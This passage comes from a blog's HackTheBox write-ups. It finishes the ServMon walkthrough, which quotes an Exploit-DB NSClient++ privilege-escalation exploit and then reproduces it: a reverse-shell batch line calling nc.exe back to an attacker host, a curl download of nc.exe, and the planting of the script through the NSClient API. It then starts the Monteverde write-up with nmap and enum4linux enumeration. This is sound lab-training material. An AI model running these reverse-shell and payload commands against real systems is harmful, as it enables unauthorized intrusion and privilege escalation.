&lt;span class="code-line"&gt;---------------------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ cat /usr/share/exploitdb/exploits/windows/local/46802.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Author: bzyo&lt;/span&gt;
&lt;span class="code-line"&gt;Twitter: @bzyo_&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation&lt;/span&gt;
&lt;span class="code-line"&gt;Date: 05-05-19&lt;/span&gt;
&lt;span class="code-line"&gt;Vulnerable Software: NSClient++ 0.5.2.35&lt;/span&gt;
&lt;span class="code-line"&gt;Vendor Homepage: http://nsclient.org/&lt;/span&gt;
&lt;span class="code-line"&gt;Version: 0.5.2.35&lt;/span&gt;
&lt;span class="code-line"&gt;Software Link: http://nsclient.org/download/&lt;/span&gt;
&lt;span class="code-line"&gt;Tested on: Windows 10 x64&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Details:&lt;/span&gt;
&lt;span class="code-line"&gt;When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator&amp;#39;s password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn&amp;#39;t seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Prerequisites:&lt;/span&gt;
&lt;span class="code-line"&gt;To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit:&lt;/span&gt;
&lt;span class="code-line"&gt;1. Grab web administrator password&lt;/span&gt;
&lt;span class="code-line"&gt;- open c:\program files\nsclient++\nsclient.ini&lt;/span&gt;
&lt;span class="code-line"&gt;or&lt;/span&gt;
&lt;span class="code-line"&gt;- run the following that is instructed when you select forget password&lt;/span&gt;
&lt;span class="code-line"&gt;        C:\Program Files\NSClient++&amp;gt;nscp web -- password --display&lt;/span&gt;
&lt;span class="code-line"&gt;        Current password: SoSecret&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;2. Login and enable following modules including enable at startup and save configuration&lt;/span&gt;
&lt;span class="code-line"&gt;- CheckExternalScripts&lt;/span&gt;
&lt;span class="code-line"&gt;- Scheduler&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;3. Download nc.exe and evil.bat to c:\temp from attacking machine&lt;/span&gt;
&lt;span class="code-line"&gt;        @echo off&lt;/span&gt;
&lt;span class="code-line"&gt;        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;4. Setup listener on attacking machine&lt;/span&gt;
&lt;span class="code-line"&gt;        nc -nlvvp 443&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;5. Add script foobar to call evil.bat and save settings&lt;/span&gt;
&lt;span class="code-line"&gt;- Settings &amp;gt; External Scripts &amp;gt; Scripts&lt;/span&gt;
&lt;span class="code-line"&gt;- Add New&lt;/span&gt;
&lt;span class="code-line"&gt;        - foobar&lt;/span&gt;
&lt;span class="code-line"&gt;                command = c:\temp\evil.bat&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;6. Add schedulede to call script every 1 minute and save settings&lt;/span&gt;
&lt;span class="code-line"&gt;- Settings &amp;gt; Scheduler &amp;gt; Schedules&lt;/span&gt;
&lt;span class="code-line"&gt;- Add new&lt;/span&gt;
&lt;span class="code-line"&gt;        - foobar&lt;/span&gt;
&lt;span class="code-line"&gt;                interval = 1m&lt;/span&gt;
&lt;span class="code-line"&gt;                command = foobar&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;7. Restart the computer and wait for the reverse shell on attacking machine&lt;/span&gt;
&lt;span class="code-line"&gt;        nc -nlvvp 443&lt;/span&gt;
&lt;span class="code-line"&gt;        listening on [any] 443 ...&lt;/span&gt;
&lt;span class="code-line"&gt;        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671&lt;/span&gt;
&lt;span class="code-line"&gt;        Microsoft Windows [Version 10.0.17134.753]&lt;/span&gt;
&lt;span class="code-line"&gt;        (c) 2018 Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        C:\Program Files\NSClient++&amp;gt;whoami&lt;/span&gt;
&lt;span class="code-line"&gt;        whoami&lt;/span&gt;
&lt;span class="code-line"&gt;        nt authority\system&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;First of all we get the password for the NSClient and the content of
&lt;code&gt;nsclient.ini&lt;/code&gt; in order to see the access restriction. The application is only
available from localhost.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadine@SERVMON C:\&amp;gt;cd &amp;quot;C:\Program Files\NSClient++&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;nadine@SERVMON C:\Program Files\NSClient++&amp;gt;nscp web -- password --display&lt;/span&gt;
&lt;span class="code-line"&gt;Current password: ew2x6SsGTxjRwXOT&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;nadine@SERVMON C:\Program Files\NSClient++&amp;gt;type nsclient.ini&lt;/span&gt;
&lt;span class="code-line"&gt;´╗┐# If you want to fill this file with all available options run the following command:&lt;/span&gt;
&lt;span class="code-line"&gt;#   nscp settings --generate --add-defaults --load-all&lt;/span&gt;
&lt;span class="code-line"&gt;# If you want to activate a module and bring in all its options use:&lt;/span&gt;
&lt;span class="code-line"&gt;#   nscp settings --activate-module &amp;lt;MODULE NAME&amp;gt; --add-defaults&lt;/span&gt;
&lt;span class="code-line"&gt;# For details run: nscp settings --help&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;; in flight - TODO&lt;/span&gt;
&lt;span class="code-line"&gt;[/settings/default]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;; Undocumented key&lt;/span&gt;
&lt;span class="code-line"&gt;password = ew2x6SsGTxjRwXOT&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;; Undocumented key&lt;/span&gt;
&lt;span class="code-line"&gt;allowed hosts = 127.0.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we upload &lt;code&gt;nc.exe&lt;/code&gt; from &lt;code&gt;/usr/share/windows-binaries&lt;/code&gt; using a python simple
http server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadine@SERVMON C:\Temp&amp;gt;curl http://10.10.14.200:8081/nc.exe -o nc.exe&lt;/span&gt;
&lt;span class="code-line"&gt;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;/span&gt;
&lt;span class="code-line"&gt;                                Dload  Upload   Total   Spent    Left  Speed&lt;/span&gt;
&lt;span class="code-line"&gt;100 59392  100 59392    0     0  59392      0  0:00:01 --:--:--  0:00:01  264k&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We know that the NSClient is only available from localhost. So we mount an SSH
tunnel (&lt;code&gt;-D&lt;/code&gt; option) and use it as a socks proxy in our browser. Nevertheless
the application is buggy and unstable from a web browser (either Firefox, Chromium or Chrome).&lt;/p&gt;
&lt;p&gt;Therefore we use the &lt;a href="https://docs.nsclient.org/api/"&gt;NSClient API&lt;/a&gt; directly
from our SSH connection (or we can use &lt;code&gt;proxychains&lt;/code&gt; with our SOCKS tunnel)
in order to put a simple script that will call our netcat binary.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadine@SERVMON C:\Temp&amp;gt;curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/me.bat --data-binary &amp;quot;C:\Temp\nc.exe 10.10.14.200 443 -e cmd.exe&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Enter host password for user &amp;#39;admin&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;Added me as scripts\me.bat&lt;/span&gt;
&lt;span class="code-line"&gt;nadine@SERVMON C:\Temp&amp;gt;curl -s -k -u admin https://localhost:8443/api/v1/queries&lt;/span&gt;
&lt;span class="code-line"&gt;Enter host password for user &amp;#39;admin&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;[{&amp;quot;description&amp;quot;:&amp;quot;Check status of scheduled jobs.&amp;quot;,&amp;quot;metadata&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;check_tasksched&amp;quot;,&amp;quot;query_url&amp;quot;:&amp;quot;https://localhost:8443/api/v1/queries/check_tasksched/&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;check_tasksched&amp;quot;},{&amp;quot;description&amp;quot;:&amp;quot;Legacy version of check_tasksched&amp;quot;,&amp;quot;m&lt;/span&gt;
&lt;span class="code-line"&gt;etadata&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;checktasksched&amp;quot;,&amp;quot;query_url&amp;quot;:&amp;quot;https://localhost:8443/api/v1/queries/checktasksched/&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;CheckTaskSched&amp;quot;},{&amp;quot;description&amp;quot;:&amp;quot;External script: scripts\\me.bat&amp;quot;,&amp;quot;metadata&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;me&amp;quot;,&amp;quot;query_url&amp;quot;:&amp;quot;https://localhost:8&lt;/span&gt;
&lt;span class="code-line"&gt;443/api/v1/queries/me/&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;me&amp;quot;},{&amp;quot;description&amp;quot;:&amp;quot;External script: scripts\\rvsh.bat&amp;quot;,&amp;quot;metadata&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;rvsh&amp;quot;,&amp;quot;query_url&amp;quot;:&amp;quot;https://localhost:8443/api/v1/queries/rvsh/&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;rvsh&amp;quot;}]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we run a listener on our box and at the same time we call our command. This
give a shell as administrator on the box and we are able to retrieve the root
flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadine@SERVMON C:\Temp&amp;gt;curl -s -k -u admin &amp;quot;https://localhost:8443/api/v1/queries/me/commands/execute?time=3m&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Enter host password for user &amp;#39;admin&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~/pown/htb_servmon/srv$ sudo nc -l -p 443&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.18363.752]&lt;/span&gt;
&lt;span class="code-line"&gt;(c) 2019 Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Program Files\NSClient++&amp;gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;f16c1d179c239f4ffe2ea0821759198b&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;What a pain. The box was really unstable on public servers. At the end the box
is not really difficult.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="exploit"></category></entry><entry><title>HTB: Monteverde</title><link href="https://maggick.fr/2020/06/htb-monteverde.html" rel="alternate"></link><published>2020-06-15T09:00:00+02:00</published><updated>2020-06-15T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-15:/2020/06/htb-monteverde.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.06/monteverde_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/223"&gt;Monteverde&lt;/a&gt; published on
January the 11th 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt;.
This box is classified as a medium machine. The user part is quit direct and
easy and involve to enumerate a few basic services.
The root part was harder for me as it is based on a specific issue with Azure AD
and Password Hash Synchronisation.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.06/monteverde_card.png" alt="Craft card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/223"&gt;Monteverde&lt;/a&gt; published on
January the 11th 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt;.
This box is classified as a medium machine. The user part is quit direct and
easy and involve to enumerate a few basic services.
The root part was harder for me as it is based on a specific issue with Azure AD
and Password Hash Synchronisation.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. As often with MS Windows Box a lot of ports are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Jan 12 08:35:35 2020 as: nmap -p- -sS -oN nmap_all 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.27s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65516 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;53/tcp    open  domain&lt;/span&gt;
&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;389/tcp   open  ldap&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds&lt;/span&gt;
&lt;span class="code-line"&gt;464/tcp   open  kpasswd5&lt;/span&gt;
&lt;span class="code-line"&gt;593/tcp   open  http-rpc-epmap&lt;/span&gt;
&lt;span class="code-line"&gt;636/tcp   open  ldapssl&lt;/span&gt;
&lt;span class="code-line"&gt;3268/tcp  open  globalcatLDAP&lt;/span&gt;
&lt;span class="code-line"&gt;3269/tcp  open  globalcatLDAPssl&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  wsman&lt;/span&gt;
&lt;span class="code-line"&gt;9389/tcp  open  adws&lt;/span&gt;
&lt;span class="code-line"&gt;49667/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49669/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49670/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49671/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49699/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49768/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sun Jan 12 08:47:28 2020 -- 1 IP address (1 host up) scanned in 712.82 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run a service scan on the open ports.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Jan 12 08:58:05 2020 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49699,49768 -sSV -oN nmap_sv 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.36s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;53/tcp    open  domain?&lt;/span&gt;
&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-12 14:07:30Z)&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
&lt;span class="code-line"&gt;464/tcp   open  kpasswd5?&lt;/span&gt;
&lt;span class="code-line"&gt;593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;636/tcp   open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;3269/tcp  open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;9389/tcp  open  mc-nmf        .NET Message Framing&lt;/span&gt;
&lt;span class="code-line"&gt;49667/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;49670/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49671/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49699/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49768/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port53-TCP:V=7.80%I=7%D=1/12%Time=5E1B25FA%P=x86_64-pc-linux-gnu%r(DNSV&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ersionBindReqTCP,20,&amp;quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x04bind\0\0\x10\0\x03&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sun Jan 12 09:00:45 2020 -- 1 IP address (1 host up) scanned in 159.60 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="enum4linux"&gt;Enum4linux&lt;/h2&gt;
&lt;p&gt;We run &lt;a href="https://github.com/portcullislabs/enum4linux"&gt;enum4linux&lt;/a&gt; on the box.
We get a list of the box username:
 * Guest
 * mhope
 * roleary
 * SABatchJobs
 * smorgan
 * svc-ata
 * svc-bexec
 * svc-netapp&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;perl enum4linux.pl 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.&lt;/span&gt;
&lt;span class="code-line"&gt;Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 12 09:09:01 2020&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;==========================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Target Information    |&lt;/span&gt;
&lt;span class="code-line"&gt;==========================&lt;/span&gt;
&lt;span class="code-line"&gt;Target ........... 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;RID Range ........ 500-550,1000-1050&lt;/span&gt;
&lt;span class="code-line"&gt;Username ......... &amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;Password ......... &amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;====================================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Enumerating Workgroup/Domain on 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;====================================================&lt;/span&gt;
&lt;span class="code-line"&gt;[E] Can&amp;#39;t find workgroup/domain&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;============================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Nbtstat Information for 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;============================================&lt;/span&gt;
&lt;span class="code-line"&gt;Looking up status of 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;No reply from 10.10.10.172&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;=====================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Session Check on 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;=====================================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 437.&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Server 10.10.10.172 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 451.&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Got domain/workgroup name:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;===========================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Getting domain SID for 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;===========================================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 359.&lt;/span&gt;
&lt;span class="code-line"&gt;Domain Name: MEGABANK&lt;/span&gt;
&lt;span class="code-line"&gt;Domain Sid: S-1-5-21-391775091-850290835-3566037492&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Host is part of a domain (not a workgroup)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;======================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    OS information on 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;======================================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 458.&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $os_info in concatenation (.) or string at enum4linux.pl line 464.&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Got OS info for 10.10.10.172 from smbclient:&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 467.&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Got OS info for 10.10.10.172 from srvinfo:&lt;/span&gt;
&lt;span class="code-line"&gt;Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;=============================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Users on 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;=============================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2   Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos   Name: Dimitris Galanos  Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary    Name: Ray O&amp;#39;Leary   Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs   Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan    Name: Sally Morgan  Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata    Name: svc-ata   Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec  Name: svc-bexec Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp Name: svc-netapp    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 883.&lt;/span&gt;
&lt;span class="code-line"&gt;user:[Guest] rid:[0x1f5]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[AAD_987d7f2f57d2] rid:[0x450]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[mhope] rid:[0x641]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[SABatchJobs] rid:[0xa2a]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[svc-ata] rid:[0xa2b]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[svc-bexec] rid:[0xa2c]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[svc-netapp] rid:[0xa2d]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[dgalanos] rid:[0xa35]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[roleary] rid:[0xa36]&lt;/span&gt;
&lt;span class="code-line"&gt;user:[smorgan] rid:[0xa37]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;=========================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Share Enumeration on 10.10.10.172    |&lt;/span&gt;
&lt;span class="code-line"&gt;=========================================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 640.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
